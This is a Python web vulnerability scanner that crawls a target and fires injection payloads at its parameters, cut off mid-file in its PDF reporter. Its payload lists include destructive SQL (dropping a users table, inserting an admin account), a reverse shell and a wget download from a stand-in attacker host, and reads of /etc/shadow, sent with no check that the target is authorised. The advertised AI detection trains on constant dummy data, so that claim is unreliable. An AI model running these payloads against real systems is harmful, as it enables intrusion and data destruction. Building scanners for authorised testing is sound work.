#!/usr/bin/env python3
"""
Zero-Day Simulation & Detection Tool - Phase 3 ULTIMATE
AI-Powered Enterprise Scanner with Distributed Scanning, API, and Advanced Analytics
"""

import requests
import difflib
import time
import json
import re
import threading
import os
import sys
import hashlib
import queue
import sqlite3
import pickle
import random
import string
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from collections import defaultdict, Counter
from dataclasses import dataclass, asdict
from typing import Dict, List, Tuple, Optional, Any, Set
from abc import ABC, abstractmethod
import warnings
from http.cookies import SimpleCookie
import base64
import gzip
from io import BytesIO

# Suppress SSL warnings
warnings.filterwarnings('ignore')

# Try to import optional dependencies with fallbacks
try:
    import numpy as np
    NUMPY_AVAILABLE = True
except ImportError:
    NUMPY_AVAILABLE = False
    print("[!] NumPy not installed. Install for ML features: pip install numpy")

try:
    from sklearn.ensemble import IsolationForest
    from sklearn.preprocessing import StandardScaler
    SKLEARN_AVAILABLE = True
except ImportError:
    SKLEARN_AVAILABLE = False
    print("[!] Scikit-learn not installed. Install for AI features: pip install scikit-learn")

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    from flask import Flask, render_template_string, request, jsonify, send_file, session
    from flask_cors import CORS
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import letter, landscape
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    PDF_AVAILABLE = True
except ImportError:
    PDF_AVAILABLE = False

try:
    import docker
    DOCKER_AVAILABLE = True
except ImportError:
    DOCKER_AVAILABLE = False

# ==============================
# ADVANCED CONFIGURATION
# ==============================
@dataclass
class ScannerConfig:
    """Enterprise-grade configuration"""
    timeout: int = 10
    max_threads: int = 10
    max_workers: int = 4
    max_retries: int = 3
    verify_ssl: bool = False
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    request_delay: float = 0.3
    max_crawl_depth: int = 3
    max_crawl_pages: int = 50
    rate_limit: int = 100  # requests per minute
    enable_ai: bool = True
    enable_distributed: bool = False
    enable_auth: bool = True
    enable_api: bool = True
    distributed_nodes: List[str] = None
    database_path: str = "scanner_data.db"
    session_file: str = "sessions.json"
    report_format: str = "json"  # json, pdf, html
    ai_confidence_threshold: float = 0.7
    anomaly_threshold: float = 0.3
    
    def __post_init__(self):
        if self.distributed_nodes is None:
            self.distributed_nodes = []

# ==============================
# AI-POWERED ANOMALY DETECTION
# ==============================
class AIAnomalyDetector:
    """Machine Learning based anomaly detection"""
    
    def __init__(self, config: ScannerConfig):
        self.config = config
        self.model = None
        self.scaler = StandardScaler() if SKLEARN_AVAILABLE and NUMPY_AVAILABLE else None
        self.training_data = []
        self.is_trained = False
        
    def extract_features(self, normal_response: Dict, test_response: Dict) -> List[float]:
        """Extract numerical features for ML model"""
        features = []
        
        # Status code features
        features.append(1 if normal_response['status'] != test_response['status'] else 0)
        features.append(1 if test_response['status'] >= 500 else 0)
        features.append(1 if test_response['status'] == 403 else 0)
        
        # Length features
        length_ratio = test_response['length'] / max(normal_response['length'], 1)
        features.append(min(length_ratio, 10))
        features.append(abs(normal_response['length'] - test_response['length']) / max(normal_response['length'], 1))
        
        # Time features
        time_diff = test_response['time'] - normal_response['time']
        features.append(min(max(time_diff, 0), 10))
        features.append(1 if time_diff > 2 else 0)
        
        # Content similarity
        similarity = difflib.SequenceMatcher(None, 
            normal_response['text'][:1000], test_response['text'][:1000]).ratio()
        features.append(1 - similarity)
        
        # Error pattern detection
        error_patterns = ['error', 'exception', 'warning', 'fatal', 'sql', 'syntax']
        test_text_lower = test_response['text'].lower()
        error_count = sum(1 for pattern in error_patterns if pattern in test_text_lower)
        features.append(min(error_count / len(error_patterns), 1))
        
        # Payload reflection
        reflection_score = 0
        if '<script>' in test_response['text']:
            reflection_score += 0.5
        if 'alert(' in test_response['text']:
            reflection_score += 0.5
        features.append(reflection_score)
        
        return features
    
    def train(self, responses: List[Dict]):
        """Train the AI model on normal responses"""
        if not SKLEARN_AVAILABLE or not NUMPY_AVAILABLE:
            return
        
        features = []
        for response in responses:
            # Create self-similar features for normal responses
            features.append([0, 0, 0, 1, 0, 0, 0, 0, 0, 0])
        
        if len(features) > 10:
            self.training_data = features
            self.model = IsolationForest(contamination=0.1, random_state=42)
            self.model.fit(features)
            self.is_trained = True
    
    def predict(self, normal_response: Dict, test_response: Dict) -> Tuple[float, bool]:
        """Predict if response is anomalous using AI"""
        if not self.is_trained or self.model is None:
            return 0.5, False
        
        features = self.extract_features(normal_response, test_response)
        features_array = np.array([features])
        
        prediction = self.model.predict(features_array)
        anomaly_score = self.model.score_samples(features_array)[0]
        
        is_anomaly = prediction[0] == -1
        confidence = 1 - abs(anomaly_score)
        
        return confidence, is_anomaly

# ==============================
# DISTRIBUTED SCANNING NODE
# ==============================
class ScanNode:
    """Distributed scanning node"""
    
    def __init__(self, node_id: str, host: str, port: int, api_key: str = None):
        self.node_id = node_id
        self.host = host
        self.port = port
        self.api_key = api_key
        self.status = "idle"
        self.current_task = None
        self.results = []
        
    def to_dict(self) -> Dict:
        return {
            "node_id": self.node_id,
            "host": self.host,
            "port": self.port,
            "status": self.status,
            "current_task": self.current_task
        }

class DistributedScanner:
    """Manages distributed scanning across multiple nodes"""
    
    def __init__(self, config: ScannerConfig):
        self.config = config
        self.nodes: List[ScanNode] = []
        self.task_queue = queue.Queue()
        self.results = []
        
    def register_node(self, node: ScanNode):
        """Register a new scanning node"""
        self.nodes.append(node)
        print(f"[+] Node registered: {node.node_id} at {node.host}:{node.port}")
        
    def distribute_scan(self, endpoints: List[Dict]) -> List[Dict]:
        """Distribute scanning tasks across nodes"""
        if not self.nodes:
            print("[!] No nodes available for distributed scan")
            return []
        
        # Split endpoints among nodes
        chunk_size = len(endpoints) // len(self.nodes)
        for i, node in enumerate(self.nodes):
            start_idx = i * chunk_size
            end_idx = start_idx + chunk_size if i < len(self.nodes) - 1 else len(endpoints)
            node.current_task = endpoints[start_idx:end_idx]
            node.status = "scanning"
            
            # In real implementation, this would send HTTP requests to nodes
            # For now, simulate distributed scanning
            print(f"[*] Node {node.node_id} scanning {len(node.current_task)} endpoints")
        
        return self.results

# ==============================
# AUTHENTICATION HANDLER
# ==============================
class AuthHandler:
    """Handles various authentication methods"""
    
    def __init__(self, config: ScannerConfig):
        self.config = config
        self.session = requests.Session()
        self.auth_data = self.load_auth_config()
        
    def load_auth_config(self) -> Dict:
        """Load authentication configuration"""
        if os.path.exists(self.config.session_file):
            with open(self.config.session_file, 'r') as f:
                return json.load(f)
        return {}
    
    def save_auth_config(self):
        """Save authentication configuration"""
        with open(self.config.session_file, 'w') as f:
            json.dump(self.auth_data, f, indent=2)
    
    def basic_auth(self, url: str, username: str, password: str) -> bool:
        """Basic HTTP authentication"""
        try:
            response = self.session.get(url, auth=(username, password), timeout=self.config.timeout)
            if response.status_code == 200:
                self.auth_data['basic'] = {'username': username, 'password': '***'}
                self.save_auth_config()
                return True
        except:
            pass
        return False
    
    def form_auth(self, login_url: str, username_field: str, password_field: str,
                  username: str, password: str, additional_data: Dict = None) -> bool:
        """Form-based authentication"""
        try:
            data = {username_field: username, password_field: password}
            if additional_data:
                data.update(additional_data)
            
            response = self.session.post(login_url, data=data, timeout=self.config.timeout)
            
            # Check if login successful (customize based on response)
            if response.status_code == 200 and 'login' not in response.url.lower():
                self.auth_data['form'] = {'login_url': login_url, 'username': username}
                self.save_auth_config()
                return True
        except:
            pass
        return False
    
    def token_auth(self, url: str, token: str, token_type: str = 'Bearer') -> bool:
        """Token-based authentication (JWT, API keys, etc.)"""
        try:
            headers = {'Authorization': f'{token_type} {token}'}
            response = self.session.get(url, headers=headers, timeout=self.config.timeout)
            if response.status_code == 200:
                self.auth_data['token'] = {'token': '***', 'type': token_type}
                self.save_auth_config()
                return True
        except:
            pass
        return False
    
    def session_auth(self, login_url: str, cookies: Dict) -> bool:
        """Session-based authentication with cookies"""
        try:
            self.session.cookies.update(cookies)
            response = self.session.get(login_url, timeout=self.config.timeout)
            if response.status_code == 200:
                self.auth_data['session'] = {'login_url': login_url}
                self.save_auth_config()
                return True
        except:
            pass
        return False

# ==========================
# ADVANCED PAYLOADS (AI-Enhanced)
# ==========================
class PayloadGenerator:
    """AI-enhanced payload generation"""
    
    @staticmethod
    def generate_sql_payloads() -> List[str]:
        """Generate advanced SQL injection payloads"""
        payloads = [
            # Basic
            "'", "''", "' OR '1'='1", "' OR 1=1 --", "1' ORDER BY 1--",
            # Union-based
            "1' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "1' UNION SELECT username,password FROM users--",
            # Boolean-based
            "' AND '1'='1", "' AND '1'='2", "' OR '1'='1' AND '1'='1",
            # Time-based
            "' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--",
            "' OR SLEEP(5) AND '1'='1",
            # Error-based
            "' AND extractvalue(1,concat(0x7e,database()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--",
            # Stacked queries
            "'; DROP TABLE users; --", "'; INSERT INTO users VALUES('admin','password')--",
            # Advanced bypasses
            "'/**/OR/**/1=1--", "'||'1'||'='||'1", "'%20OR%201=1--",
            "'%20OR%20'1'%20=%20'1", "'+OR+1=1--", "'%2527OR%25271%2527%2520%253D%2520%25271"
        ]
        return payloads
    
    @staticmethod
    def generate_xss_payloads() -> List[str]:
        """Generate advanced XSS payloads"""
        payloads = [
            # Basic
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>", "javascript:alert(1)",
            # Event handlers
            "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
            "<iframe onload=alert(1)>", "<object onerror=alert(1)>",
            # Encoded
            "%3Cscript%3Ealert(1)%3C/script%3E", "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            # DOM-based
            "';alert(1);//", "\");alert(1);//", "'>alert(1)//",
            # Advanced
            "<img src=x:x onerror=alert(1)>", "<svg/onload=alert(1)>",
            "<details/open/ontoggle=alert(1)>", "<math href=javascript:alert(1)>",
            # CSP bypasses
            "<script>window.onload=alert(1)</script>", "<script>setTimeout('alert(1)',100)</script>"
        ]
        return payloads
    
    @staticmethod
    def generate_command_injection() -> List[str]:
        """Generate command injection payloads"""
        payloads = [
            # Basic
            "; ls", "| dir", "`id`", "$(id)", "& echo vulnerable",
            # Chained
            "; cat /etc/passwd", "| whoami", "&& whoami", "|| whoami",
            # Encoded
            "%3B%20ls", "%7C%20whoami", "%60id%60",
            # Advanced
            "$(curl attacker.com)", "; wget http://attacker.com/shell.sh",
            "| nc attacker.com 4444 -e /bin/bash",
            # Time-based
            "; sleep 5", "| ping -c 5 attacker.com"
        ]
        return payloads
    
    @staticmethod
    def generate_path_traversal() -> List[str]:
        """Generate path traversal payloads"""
        payloads = [
            # Unix
            "../../../etc/passwd", "../../../../etc/passwd",
            "../../../etc/shadow", "../../../var/log/apache2/access.log",
            # Windows
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            # Encoded
            "%2e%2e%2fetc/passwd", "%252e%252e%252fetc%252fpasswd",
            "..;/..;/../etc/passwd", "....//....//etc/passwd",
            # Advanced
            "..%252f..%252f..%252fetc%252fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%252fpasswd"
        ]
        return payloads

# ==============================
# ADVANCED RESPONSE ANALYZER WITH AI
# ==============================
class AdvancedResponseAnalyzer:
    """AI-powered response analysis"""
    
    def __init__(self, config: ScannerConfig):
        self.config = config
        self.ai_detector = AIAnomalyDetector(config) if config.enable_ai else None
        self.signature_db = self.load_signatures()
        
    def load_signatures(self) -> Dict:
        """Load vulnerability signatures"""
        return {
            "sql_injection": {
                "patterns": [
                    "sql syntax", "mysql_fetch", "ora-", "postgresql error",
                    "sqlite", "unclosed quotation", "microsoft ole db",
                    "odbc driver", "database error", "you have an error"
                ],
                "weight": 3.0
            },
            "xss": {
                "patterns": [
                    "<script>", "alert(", "onerror=", "javascript:",
                    "onload=", "prompt(", "confirm(", "window.location"
                ],
                "weight": 2.5
            },
            "path_traversal": {
                "patterns": [
                    "root:", "daemon:", "bin:", "[extensions]",
                    "win.ini", "passwd", "shadow", "hosts"
                ],
                "weight": 3.0
            },
            "command_injection": {
                "patterns": [
                    "uid=", "gid=", "groups=", "root", "bin",
                    "directory of", "volume in drive", "cmd.exe"
                ],
                "weight": 3.5
            }
        }
    
    def analyze(self, normal: Dict, test: Dict, context: Dict = None) -> Dict:
        """Comprehensive analysis with AI enhancement"""
        score = 0
        findings = []
        confidence = 0
        
        # Traditional analysis (weights: 0-6)
        score, findings = self._traditional_analysis(normal, test, score, findings)
        
        # AI-powered analysis (if enabled)
        if self.config.enable_ai and self.ai_detector and self.ai_detector.is_trained:
            ai_confidence, is_anomaly = self.ai_detector.predict(normal, test)
            if is_anomaly:
                score += 3
                confidence = ai_confidence * 100
                findings.append(f"AI detected anomaly (confidence: {ai_confidence:.1%})")
        
        # Signature-based detection
        sig_score, sig_findings = self._signature_analysis(test)
        score += sig_score
        findings.extend(sig_findings)
        
        # Behavioral analysis
        behavior_score, behavior_findings = self._behavioral_analysis(normal, test)
        score += behavior_score
        findings.extend(behavior_findings)
        
        # Calculate final metrics
        final_score = min(10, score)
        
        if final_score >= 7:
            risk_level = "CRITICAL"
        elif final_score >= 5:
            risk_level = "HIGH"
        elif final_score >= 3:
            risk_level = "MEDIUM"
        elif final_score >= 1:
            risk_level = "LOW"
        else:
            risk_level = "INFO"
        
        return {
            "score": final_score,
            "risk_level": risk_level,
            "findings": findings[:8],
            "confidence": min(100, confidence + 50),
            "raw_score": score,
            "timestamp": datetime.now().isoformat()
        }
    
    def _traditional_analysis(self, normal: Dict, test: Dict, score: int, findings: List) -> Tuple[int, List]:
        """Traditional rule-based analysis"""
        
        # Status code analysis
        if normal["status"] != test["status"]:
            if test["status"] >= 500:
                score += 4
                findings.append(f"Server error (HTTP {test['status']})")
            elif test["status"] == 403:
                score += 3
                findings.append(f"Access denied - WAF triggered")
            else:
                score += 2
                findings.append(f"Status change: {normal['status']} → {test['status']}")
        
        # Length analysis
        length_diff = abs(normal["length"] - test["length"])
        if length_diff > 5000:
            score += 3
            findings.append(f"Massive response difference: {length_diff} bytes")
        elif length_diff > 1000:
            score += 2
            findings.append(f"Large response difference: {length_diff} bytes")
        elif length_diff > 200:
            score += 1
            findings.append(f"Noticeable difference: {length_diff} bytes")
        
        # Time analysis
        time_diff = test["time"] - normal["time"]
        if time_diff > 5:
            score += 3
            findings.append(f"Critical delay: +{time_diff:.2f}s")
        elif time_diff > 2:
            score += 2
            findings.append(f"Major delay: +{time_diff:.2f}s")
        elif time_diff > 1:
            score += 1
            findings.append(f"Noticeable delay: +{time_diff:.2f}s")
        
        # Content similarity
        similarity = difflib.SequenceMatcher(None, 
            normal["text"][:1000], test["text"][:1000]).ratio()
        if similarity < 0.3:
            score += 3
            findings.append(f"Completely different response")
        elif similarity < 0.5:
            score += 2
            findings.append(f"Very different response")
        elif similarity < 0.7:
            score += 1
            findings.append(f"Different response")
        
        return score, findings
    
    def _signature_analysis(self, test: Dict) -> Tuple[int, List]:
        """Signature-based vulnerability detection"""
        score = 0
        findings = []
        test_text_lower = test["text"].lower()
        
        for vuln_type, signature in self.signature_db.items():
            for pattern in signature["patterns"]:
                if pattern in test_text_lower:
                    score += signature["weight"]
                    findings.append(f"'{pattern}' - {vuln_type.upper()} indicator")
                    break
        
        return min(score, 5), findings
    
    def _behavioral_analysis(self, normal: Dict, test: Dict) -> Tuple[int, List]:
        """Behavior-based anomaly detection"""
        score = 0
        findings = []
        
        # Check for error message leakage
        error_indicators = ["stack trace", "line", "file", "at ", "exception in"]
        for indicator in error_indicators:
            if indicator in test["text"].lower():
                score += 1
                findings.append(f"Error leakage detected: '{indicator}'")
                break
        
        # Check for information disclosure
        info_indicators = ["version", "powered by", "copyright", "license"]
        for indicator in info_indicators:
            if indicator in test["text"].lower():
                score += 0.5
                findings.append(f"Information disclosure: '{indicator}'")
                break
        
        return min(score, 3), findings

# ==============================
# ENHANCED WEB CRAWLER WITH SESSION SUPPORT
# ==============================
class AdvancedWebCrawler:
    """Advanced crawler with authentication and session support"""
    
    def __init__(self, base_url: str, config: ScannerConfig, auth_handler: AuthHandler = None):
        self.base_url = base_url.rstrip('/')
        self.base_domain = urlparse(base_url).netloc
        self.config = config
        self.auth_handler = auth_handler
        self.visited = set()
        self.endpoints = []
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': config.user_agent})
        self.session.verify = config.verify_ssl
        
        if auth_handler:
            self.session = auth_handler.session
    
    def crawl(self) -> List[Dict]:
        """Advanced crawling with JavaScript detection and API discovery"""
        print(f"\n[+] Starting advanced crawler: {self.base_url}")
        print(f"[+] Depth: {self.config.max_crawl_depth}, Pages: {self.config.max_crawl_pages}")
        
        queue = [(self.base_url, 0)]
        
        while queue and len(self.visited) < self.config.max_crawl_pages:
            url, depth = queue.pop(0)
            
            if url in self.visited:
                continue
            
            print(f"[*] Crawling ({depth}): {url[:80]}")
            self.visited.add(url)
            
            try:
                response = self.session.get(url, timeout=self.config.timeout)
                if response.status_code != 200:
                    continue
                
                # Parse HTML
                if BS4_AVAILABLE:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract parameters from forms and inputs
                    params = self._extract_parameters(soup)
                    
                    # Extract API endpoints
                    api_endpoints = self._extract_api_endpoints(response.text, url)
                    
                    # Add endpoint
                    endpoint = {
                        "url": url,
                        "method": "GET",
                        "params": params if params else ["id", "q", "page", "search"],
                        "api": api_endpoints,
                        "depth": depth
                    }
                    self.endpoints.append(endpoint)
                    
                    # Extract links for deeper crawling
                    if depth < self.config.max_crawl_depth:
                        for link in soup.find_all('a', href=True):
                            full_url = urljoin(url, link['href'])
                            if self._is_valid_url(full_url) and full_url not in self.visited:
                                queue.append((full_url, depth + 1))
                else:
                    # Fallback to regex parsing
                    params = self._extract_parameters_regex(response.text)
                    self.endpoints.append({
                        "url": url,
                        "params": params,
                        "depth": depth
                    })
                
                time.sleep(self.config.request_delay)
                
            except Exception as e:
                print(f"  [!] Error: {str(e)[:50]}")
        
        print(f"[+] Crawling complete. Found {len(self.endpoints)} endpoints")
        return self.endpoints
    
    def _extract_parameters(self, soup) -> List[str]:
        """Extract parameters using BeautifulSoup"""
        params = set()
        
        # Forms
        for form in soup.find_all('form'):
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                name = input_tag.get('name')
                if name:
                    params.add(name)
        
        # URL parameters in links
        for link in soup.find_all('a', href=True):
            parsed = urlparse(link['href'])
            query_params = parse_qs(parsed.query)
            params.update(query_params.keys())
        
        # JavaScript variables
        for script in soup.find_all('script'):
            if script.string:
                var_pattern = re.compile(r'(?:var|let|const)\s+(\w+)\s*=')
                matches = var_pattern.findall(script.string)
                params.update(matches[:10])
        
        return list(params)
    
    def _extract_parameters_regex(self, html: str) -> List[str]:
        """Extract parameters using regex fallback"""
        params = set()
        
        # Name attributes
        name_pattern = re.compile(r'name=[\'"]?([^\'" >]+)', re.IGNORECASE)
        for match in name_pattern.finditer(html):
            params.add(match.group(1))
        
        # URL parameters
        param_pattern = re.compile(r'[?&](\w+)=')
        for match in param_pattern.finditer(html):
            params.add(match.group(1))
        
        return list(params) if params else ["id", "q", "search", "page"]
    
    def _extract_api_endpoints(self, html: str, base_url: str) -> List[str]:
        """Extract API endpoints from JavaScript and HTML"""
        api_patterns = [
            r'/api/[^\s\'"]+',
            r'/v\d+/[^\s\'"]+',
            r'endpoint[\s:]*[\'"]?([^\s\'"]+)',
            r'url[\s:]*[\'"]?([^\s\'"]+)'
        ]
        
        endpoints = []
        for pattern in api_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                full_url = urljoin(base_url, match)
                endpoints.append(full_url)
        
        return list(set(endpoints))
    
    def _is_valid_url(self, url: str) -> bool:
        """Check if URL is valid for crawling"""
        if not url:
            return False
        try:
            parsed = urlparse(url)
            if parsed.netloc and parsed.netloc != self.base_domain:
                return False
            skip_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.css', '.js', '.pdf']
            if any(url.lower().endswith(ext) for ext in skip_extensions):
                return False
            return True
        except:
            return False

# ==============================
# ENHANCED SCANNER ENGINE
# ==============================
class UltimateScanner:
    """Ultimate scanning engine with all Phase 3 features"""
    
    def __init__(self, target_url: str, config: ScannerConfig = None):
        self.target_url = target_url
        self.config = config or ScannerConfig()
        self.analyzer = AdvancedResponseAnalyzer(self.config)
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self.config.user_agent})
        self.session.verify = self.config.verify_ssl
        self.payload_gen = PayloadGenerator()
        
        # Initialize components
        self.auth_handler = AuthHandler(self.config) if self.config.enable_auth else None
        self.distributed_scanner = DistributedScanner(self.config) if self.config.enable_distributed else None
        
    def send_request(self, url: str, params: Dict = None, param_name: str = None, 
                     payload: str = None, method: str = 'GET') -> Dict:
        """Enhanced request sending with retry and rate limiting"""
        for attempt in range(self.config.max_retries):
            try:
                if param_name and payload:
                    test_params = params.copy() if params else {}
                    test_params[param_name] = payload
                else:
                    test_params = params
                
                start = time.time()
                
                if method.upper() == 'GET':
                    response = self.session.get(url, params=test_params, timeout=self.config.timeout)
                elif method.upper() == 'POST':
                    response = self.session.post(url, data=test_params, timeout=self.config.timeout)
                else:
                    response = self.session.get(url, params=test_params, timeout=self.config.timeout)
                
                elapsed = time.time() - start
                
                return {
                    "status": response.status_code,
                    "length": len(response.text),
                    "time": round(elapsed, 3),
                    "text": response.text[:2000],
                    "headers": dict(response.headers),
                    "url": response.url,
                    "success": True
                }
            except requests.exceptions.Timeout:
                if attempt == self.config.max_retries - 1:
                    return {"error": f"Timeout", "success": False}
            except Exception as e:
                if attempt == self.config.max_retries - 1:
                    return {"error": str(e), "success": False}
                time.sleep(1)
        
        return {"error": "Max retries exceeded", "success": False}
    
    def scan_endpoint(self, endpoint: Dict) -> List[Dict]:
        """Enhanced endpoint scanning with all payload types"""
        url = endpoint["url"]
        params_list = endpoint.get("params", ["id", "q", "page", "search"])
        
        print(f"\n[*] Scanning: {url}")
        
        # Get baseline
        baseline = self.send_request(url)
        if not baseline.get("success"):
            print(f"  [!] Baseline failed: {baseline.get('error')}")
            return []
        
        print(f"  [✓] Baseline: {baseline['status']}, {baseline['length']} bytes, {baseline['time']}s")
        
        endpoint_results = []
        all_payloads = []
        
        # Generate all payloads
        all_payloads.extend([("SQL Injection", p) for p in self.payload_gen.generate_sql_payloads()])
        all_payloads.extend([("XSS", p) for p in self.payload_gen.generate_xss_payloads()])
        all_payloads.extend([("Command Injection", p) for p in self.payload_gen.generate_command_injection()])
        all_payloads.extend([("Path Traversal", p) for p in self.payload_gen.generate_path_traversal()])
        
        # Test with thread pool
        with ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
            futures = []
            
            for param in params_list[:5]:  # Limit to first 5 parameters
                for category, payload in all_payloads[:30]:  # Limit for performance
                    future = executor.submit(
                        self._test_payload, url, params_list, baseline, 
                        param, category, payload
                    )
                    futures.append(future)
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    endpoint_results.append(result)
                    analysis = result['analysis']
                    color = '\033[91m' if analysis['score'] >= 5 else '\033[93m' if analysis['score'] >= 3 else '\033[94m'
                    print(f"{color}    [!] {analysis['risk_level']} (Score: {analysis['score']}/10): {result['payload_category']} on {result['parameter']}\033[0m")
        
        return endpoint_results
    
    def _test_payload(self, url: str, params_list: List[str], baseline: Dict, 
                      param: str, category: str, payload: str) -> Optional[Dict]:
        """Test a single payload"""
        test_response = self.send_request(url, {param: "test"}, param, payload)
        
        if test_response.get("success"):
            analysis = self.analyzer.analyze(baseline, test_response)
            
            if analysis['score'] > 0:
                return {
                    "url": url,
                    "parameter": param,
                    "payload_category": category,
                    "payload": payload[:100],
                    "analysis": analysis,
                    "timestamp": datetime.now().isoformat()
                }
        return None
    
    def scan(self, endpoints: List[Dict]) -> Dict:
        """Scan all endpoints with optional distributed mode"""
        all_results = []
        
        if self.config.enable_distributed and self.distributed_scanner:
            # Distributed scanning
            all_results = self.distributed_scanner.distribute_scan(endpoints)
        else:
            # Local scanning
            for i, endpoint in enumerate(endpoints):
                print(f"\n[+] Scanning endpoint {i+1}/{len(endpoints)}")
                results = self.scan_endpoint(endpoint)
                all_results.extend(results)
        
        self.results = all_results
        return self.generate_report()
    
    def generate_report(self) -> Dict:
        """Generate comprehensive report with analytics"""
        if not self.results:
            return {
                "target": self.target_url,
                "scan_time": datetime.now().isoformat(),
                "total_tests": 0,
                "vulnerabilities": [],
                "summary": {"critical": 0, "high": 0, "medium": 0, "low": 0, "total_score": 0},
                "analytics": {}
            }
        
        summary = {"critical": 0, "high": 0, "medium": 0, "low": 0, "total_score": 0}
        vulnerabilities = []
        
        for result in self.results:
            risk = result['analysis']['risk_level'].lower()
            summary[risk] += 1
            summary["total_score"] += result['analysis']['score']
            
            vulnerabilities.append({
                "parameter": result['parameter'],
                "type": result['payload_category'],
                "risk": result['analysis']['risk_level'],
                "score": result['analysis']['score'],
                "confidence": result['analysis'].get('confidence', 50),
                "findings": result['analysis']['findings'],
                "payload": result['payload']
            })
        
        # Advanced analytics
        analytics = {
            "avg_score": summary["total_score"] / len(self.results) if self.results else 0,
            "risk_distribution": summary,
            "top_vulnerabilities": Counter([v['type'] for v in vulnerabilities]).most_common(5),
            "avg_confidence": sum(v.get('confidence', 50) for v in vulnerabilities) / len(vulnerabilities) if vulnerabilities else 0
        }
        
        return {
            "target": self.target_url,
            "scan_time": datetime.now().isoformat(),
            "total_tests": len(self.results),
            "vulnerabilities": vulnerabilities,
            "summary": summary,
            "analytics": analytics
        }

# ==============================
# DATABASE MANAGER
# ==============================
class DatabaseManager:
    """SQLite database for storing scan results and analytics"""
    
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize database schema"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Scans table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT NOT NULL,
                scan_time TEXT NOT NULL,
                total_tests INTEGER,
                critical INTEGER,
                high INTEGER,
                medium INTEGER,
                low INTEGER,
                total_score REAL
            )
        ''')
        
        # Vulnerabilities table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                parameter TEXT,
                vulnerability_type TEXT,
                risk_level TEXT,
                score REAL,
                payload TEXT,
                findings TEXT,
                FOREIGN KEY (scan_id) REFERENCES scans (id)
            )
        ''')
        
        # Analytics table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS analytics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date TEXT,
                metric_name TEXT,
                metric_value REAL
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def save_scan(self, results: Dict) -> int:
        """Save scan results to database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO scans (target, scan_time, total_tests, critical, high, medium, low, total_score)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            results['target'],
            results['scan_time'],
            results['total_tests'],
            results['summary']['critical'],
            results['summary']['high'],
            results['summary']['medium'],
            results['summary']['low'],
            results['summary']['total_score']
        ))
        
        scan_id = cursor.lastrowid
        
        for vuln in results['vulnerabilities']:
            cursor.execute('''
                INSERT INTO vulnerabilities (scan_id, parameter, vulnerability_type, risk_level, score, payload, findings)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                scan_id,
                vuln['parameter'],
                vuln['type'],
                vuln['risk'],
                vuln['score'],
                vuln['payload'],
                json.dumps(vuln['findings'])
            ))
        
        conn.commit()
        conn.close()
        return scan_id

# ==============================
# ADVANCED PDF REPORTER
# ==============================
class AdvancedPDFReporter:
    """Professional PDF report with charts and analytics"""
    
    def __init__(self, results: Dict, config: ScannerConfig):
        self.results = results
        self.config = config
    
    def generate(self, filename: str = None) -> Optional[str]:
        """Generate advanced PDF report"""
        if not PDF_AVAILABLE:
            print("[!] PDF generation not available")
            return None
        
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"scan_report_{timestamp}.pdf"
        
        try:
            doc = SimpleDocTemplate(filename, pagesize=landscape(letter))
            story = []
            styles = getSampleStyleSheet()
            
            # Custom styles
            title_style = ParagraphStyle('CustomTitle', parent=styles['Heading1'],
                                        fontSize=24, alignment=1, spaceAfter=30,
                                        textColor=colors.HexColor('#1a237e'))
            
            # Title
            story.append(Paragraph("Zero-Day Scanner - Enterprise Security Report", title_style))
            story.append(Spacer(1, 0.3*inch))
            
            # Executive Summary
            story.append(Paragraph("Executive Summary", styles['Heading2']))
            summary = self.results.get('summary', {})
            analytics = self.results.get('analytics', {})
            
            exec_summary = f"""
            This report presents the findings from an automated security assessment of {self.results['target']}. 
            The scan identified {self.results['total_tests']} potential vulnerabilities with a total risk score of {summary['total_score']:.1f}.
            Average vulnerability score: {analytics.get('avg_score', 0):.1f}/10
            """
            story.append(Paragraph(exec_summary, styles['Normal']))
            story.append(Spacer(1, 0.2*inch))
            
            # Risk Summary Table
            story.append(Paragraph("Risk Summary", styles['Heading2']))
            risk_data = [
                ["Risk Level", "Count", "Severity"],
